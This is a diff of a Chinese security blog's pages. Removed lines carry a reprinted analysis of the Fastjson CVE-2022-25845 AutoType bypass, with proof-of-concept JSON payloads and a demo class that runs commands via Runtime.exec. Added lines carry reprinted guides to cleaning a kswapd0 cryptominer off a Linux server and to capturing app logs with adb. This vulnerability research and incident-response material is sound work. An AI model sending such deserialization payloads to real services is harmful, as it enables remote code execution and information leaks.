+<h3><span id="22执行命令netstat-antlp-grep-1943619030-查询该地区ip的其他网络占用情况">2.2执行命令netstat -antlp | grep 194.36.190.30 查询该地区ip的其他网络占用情况</span></h3><blockquote>
+<p><code>netstat -antlp | grep 194.36.190.30</code><br><img src="/2023/10/25/kswapd0-CPU-1/6.png" alt="image"> </p>
+<p>发现只有这一个进程（当然，很有可能花卉有其他进程）</p>
+</blockquote>
+<h2><span id="3-查找进程的详细信息">3. 查找进程的详细信息</span></h2><blockquote>
+<p>我们来到&#x2F;proc&#x2F;目录下查找对应的pid号，即&#x2F;proc&#x2F;497。可以在这目录下找到kswapd0进程的详细信息。<br><code>ll /proc/497</code><br><img src="/2023/10/25/kswapd0-CPU-1/7.png" alt="image"> </p>
+</blockquote>
+<h2><span id="4查看进程的工作空间">4.查看进程的工作空间</span></h2><blockquote>
+<p><code>ps -ef | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/8.png" alt="image"> </p>
+<p>执行完后可以看到进程的pid以及进程相关文件的位置</p>
+</blockquote>
+<h2><span id="5切换到木马程序目录并删除">5.切换到木马程序目录并删除</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/9.png" alt="image"> </p>
+<p><code>rm -rf /var/tmp/.copydie</code></p>
+</blockquote>
+<h2><span id="6清理定时任务">6.清理定时任务</span></h2><blockquote>
+<p>很多病毒都是有会在定时任务里面，以至于很难清理清楚。（由于我的服务器买油开启定时任务服务，所以里面没有任务）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看定时任务：</span><br><span class="line">crontab -l</span><br><span class="line">清理计划任务: </span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>Fastjson 支持一个名为“AutoType”的功能。启用该功能后，可以为每个用户entry引入类型。开发人员只需要调用如下代码：</p>
+<p>清除后将定时任务里的相关文件都清理干净，若有其他用户，将其他用户的定时任务也清理。</p>
 </blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Feature.SupportAutoType);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">users</span> <span class="operator">=</span> (JSONArray)obj.get(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="comment">// Users[0] is of class type &quot;AdminUser&quot;</span></span><br><span class="line"><span class="comment">// Users[1] is of class type &quot;GuestUser&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>但是，如果反序列化的JSON是用户可以控制的，则在启用AutoType的情况下对其进行解析可能会出现反序列化安全问题。因为攻击者可以实例化Classpath上可用的任意类，并为类的构造函数提供任意参数。这个问题已经被很多次证实确实可以利用，并且例如ysoserial之类的框架就存在这里攻击手段的风险（Java的“gadget”类）。</p>
-<p>因此，Fastjson的开发者选择默认禁用了AutoType功能，这应该能够安全地解析人员JSON数据了。但是，AutoType的机制比这复杂得多…</p>
+<h2><span id="7杀掉kswapd0进程">7.杀掉kswapd0进程</span></h2><blockquote>
+<p>最好把木马程序和定时任务都清理完了再杀掉,要不然还会自动重启<br><code>kill -9 497</code> #kill -9 kswapd0进程的PID</p>
 </blockquote>
-<h2><span id="绕过-autotype-默认禁用策略">绕过 AutoType 默认禁用策略</span></h2><blockquote>
-<p>当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数 object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>最终，在所有flag都是默认的情况下，代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">            <span class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">                    || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">                    || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">                    || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">                    || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">                    || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">                    || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">                    || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这些被Ban的类是以下这些：</p>
-<ul>
-<li>java.lang.Object</li>
-<li>java.io.Serializable</li>
-<li>java.lang.Cloneable</li>
-<li>java.lang.Runnable</li>
-<li>java.lang.AutoCloseable</li>
-<li>java.io.Closeable</li>
-<li>java.lang.Iterable</li>
-<li>java.util.Collection</li>
-<li>java.lang.Readable</li>
-<li>java.util.EventListener</li>
-</ul>
-<p>你也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。</p>
-<p>最后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"><span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">    &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">    &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在 ParserConfig.getDeserializer()内部，有一个关键检查，用于验证目标类是否继承了 Throwable 类：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    deserializer = <span class="keyword">new</span> <span class="title class_">ThrowableDeserializer</span>(<span class="built_in">this</span>, clazz);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ThrowableDeserializer.deserialize()会处理这种数据。如果存在“@type”，它将使用 autoTypeCheck()检查并继续正常反序列化：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>因此，漏洞的核心在于 ，只要目标类继承自 Throwable 类，Fastjson便可以反序列化为任意类！</p>
-<p>在这种情况下，负责创建反序列化类的函数是 createException()，它处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">            Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">                defaultConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">                messageConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">                causeConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherValues != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">JavaBeanDeserializer</span> <span class="variable">exBeanDeser</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exClass == clazz) &#123;</span><br><span class="line">            exBeanDeser = <span class="built_in">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">exDeser</span> <span class="operator">=</span> parser.getConfig().getDeserializer(exClass);</span><br><span class="line">            <span class="keyword">if</span> (exDeser <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                exBeanDeser = (JavaBeanDeserializer) exDeser;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exBeanDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : otherValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> exBeanDeser.getFieldDeserializer(key);</span><br><span class="line">            <span class="keyword">if</span> (fieldDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> fieldDeserializer.fieldInfo;</span><br><span class="line">                <span class="keyword">if</span> (!fieldInfo.fieldClass.isInstance(value)) &#123;</span><br><span class="line">                    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());</span><br><span class="line">                &#125;</span><br><span class="line">                fieldDeserializer.setValue(ex, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2><span id="怎么利用-cve-2022-25845-漏洞">怎么利用 CVE-2022-25845 漏洞？</span></h2><blockquote>
-<p>在了解了AutoType 机制中的上述“漏洞”之后，让我们看看一个在现实中利用这个漏洞的可行性。这个漏洞据称可以实现远程代码执行。</p>
-<p>由 YoungBear 发布的漏洞利用方案，通过传入这个JSON可以运行任意系统操作命令。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这个漏洞利用方案依赖于在 Java 应用程序中定义的下面这个继承Exception的类：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson.poc20220523;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> youngbear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> youngbear@aliyun.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/5/29 8:28</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> https://blog.csdn.net/next_second</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/YoungBear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> POC类：需要代码中有该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc20220523</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>当反序列化执行到上面这一段JSON时，Poc20220523这个类就创建了，并且提供name参数是通过自动调用setter方法。</p>
-<p>如代码所示，这将最终调用包含 str &#x3D; “calc”的恶意 setName() setter 函数：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这部分的实际代码内容为打开windows计算器：</p>
-<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/2.png" alt="image" title="计算器弹窗"></p>
-<p>这个漏洞利用方案显然只是一个演示，因为任何正常的 Java 应用程序都不会包含类似于 Poc20220523 这样会基于外部参数运行 shell 命令的异常派生类。</p>
-<p>现在亟待解决的问题是 — 是否有大家熟知的 Java“gadget”类可以作为此漏洞的一部分被滥用？即继承自Exception或Throwable，并且存在相关的构造函数或者setter方法，可能会造成实际安全影响的Java类。</p>
-<p>目前，有一个兼容的gadget类（来自 Selenium 库）已经在被发布了。它会导致非常低影响的数据泄漏：</p>
-</blockquote>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$x.systemInformation&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>反序列化这个 JSON 最终会创建一个 HashMap，其中“y”值为有关机器的一些基本信息：</p>
-</blockquote>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;System info: host: &#x27;&#x27;, ip: &#x27;&#x27;, os.name: &#x27;&#x27;, os.arch: &#x27;&#x27;, os.version: &#x27;&#x27;, java.version: &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>根据应用程序的不同，这些信息最终可能会被存储或发送给攻击者（例如，它可能被写入可远程访问日志）。</p>
-<p>在检查了 ysoserial 等其他知名来源后，我们没有发现任何可以在实际场景中能够导致远程代码执行的gadget类。因此，想要利用这个漏洞进行实际攻击的黑客，需要对被共计的Java应用服务器进行深入研究，以找到一个加载在Classpath中的自定义的Java gadget类。这个类继承自Exception&#x2F;Throwable，并包含可用于获取权限、泄漏数据甚至运行任意代码的相关方法。</p>
-<p>总而言之，我们评估目前这个漏洞似乎并未构成很高风险的威胁。尽管存在一个潜在影响巨大（远程代码执行）的公共PoC漏洞可利用，并且攻击的条件并不是甚微（将不受信任的输入数据传递给特定易受攻击的 API）。最重要的是，必须找到一个合适的gadget类（或许由于一些不太可能的属性根本不存在）来突破特定被攻击的目标。</p>
-</blockquote>
-<h2><span id="如何完全修复-cve-2022-25845">如何完全修复 CVE-2022-25845？</span></h2><blockquote>
-<p>要完全修复 CVE-2022-25845，我们建议将 Fastjson 升级到最新版本，目前为 1.2.83。</p>
-</blockquote>
-<h2><span id="如何降低-cve-2022-25845-风险">如何降低 CVE-2022-25845 风险？</span></h2><blockquote>
-<p>启用 Fastjson 的“Safe Mode”可以减缓这个漏洞风险。</p>
-<p>可以通过执行以下任何一种操作来开启Safe Mode：</p>
-<p>1.通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2.通过JVM启动参数配置 -Dfastjson.parser.safeMode&#x3D;true<br>3.通过Fastjson的配置文件配置项 fastjson.parser.safeMode&#x3D;true</p>
+<h2><span id="8总结">8.总结</span></h2><blockquote>
+<p>就是跟着进程找找目录，然后杀进程，清目录<br>清定时任务<br>服务器的ftp端口最好别用22,密码尽量设置复杂点<br>尽量用密钥连接服务器，最好别用账号密码连接<br>封闭不使用的端口，做到用一个开一个（通过防火墙和安全组策略）<br>密码增强复杂性<br>及时修补系统和软件漏洞</p>
 </blockquote>
 
 
@@ -784,7 +205,579 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fastjson/" rel="tag">Fastjson</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/kswapd0-CPU-0/">
+                解决kswapd0 CPU占用率高的问题
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="解决kswapd0-cpu占用率高的问题">解决kswapd0 CPU占用率高的问题</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Remberthename/article/details/106796887">年迈的老头子</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>连接服务器时发现cpu使用率100%，使用top命令查看是kswapd0进程占用cpu极高<br><img src="/2023/10/25/kswapd0-CPU-0/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>百度下后知道kswapd0进程的作用：<br>它是虚拟内存管理中，负责换页的，操作系统每过一定时间就会唤醒kswapd ，看看内存是否紧张，如果不紧张，则睡眠，在 kswapd 中，有2个阀值，pages_hige 和 pages_low，当空闲内存页的数量低于 pages_low的时候，kswapd进程就会扫描内存并且每次释放出32 个free pages，直到 free page的数量到达pages_high。通过阻止kswapd0进程过渡活跃地消耗CPU的方法是设置大页内存。</p>
+</blockquote>
+<blockquote>
+<p>刚开始以为是本身服务器内存小的问题后来翻阅了其他大佬的博客后使用netstat -antlp查看了下系统外部连接，发现存在一个意大利的ip占用kswapd0进程和荷兰的ip占用rsync进程，，经查询后rsync是一个数据传输工具，此时意识到了事情的严重性<br><img src="/2023/10/25/kswapd0-CPU-0/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>此时开始查找进程占用的文件路径</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/1266</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br><span class="line"><span class="built_in">cd</span> /proc/1246</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-0/3.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>查询过后发现是使用prel写的一个脚本，删除整个文件夹后发下这两个进程依然存在，然后就开始了简单粗暴的过程直接kill掉这两个进程，kill点之后发现这两个进程不在了cpu的使用率下来了观察一段时间后确定cpu使用率正常了<br><img src="/2023/10/25/kswapd0-CPU-0/4.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/Catch-AppLog/">
+                app日志抓取
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="app日志抓取">app日志抓取</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42610167/article/details/104838634">测试之道.</a> 并作补充</p>
+</blockquote>
+<h2><span id="日志抓取">日志抓取</span></h2><blockquote>
+<p>1.首先通过adb devices查看设备是否连接成功<br>2.通过adb logcat命令抓取日志，保存到D盘下的1文件夹下面的log.txt文件中:<br><code>adb logcat -v time (-v time 为了获取日志时间)</code><br><img src="/2023/10/25/Catch-AppLog/1.png" alt="image"> </p>
+<p>3.将程序运行在前台，通过命令查看应用包名称：adb shell dumpsys | findstr “mFocusedActivity”<br><img src="/2023/10/25/Catch-AppLog/2.png" alt="image"> </p>
+<p>4.在导出的 log.txt 文件中搜索应用包名字，查看日志问题</p>
+</blockquote>
+<h3><span id="发生-crash-问题搜索关键字-force-finishing">发生 crash 问题，搜索关键字 force finishing</span></h3><blockquote>
+<p><img src="/2023/10/25/Catch-AppLog/3.png" alt="image"> </p>
+</blockquote>
+<h3><span id="发生-anr-问题">发生 anr 问题</span></h3><blockquote>
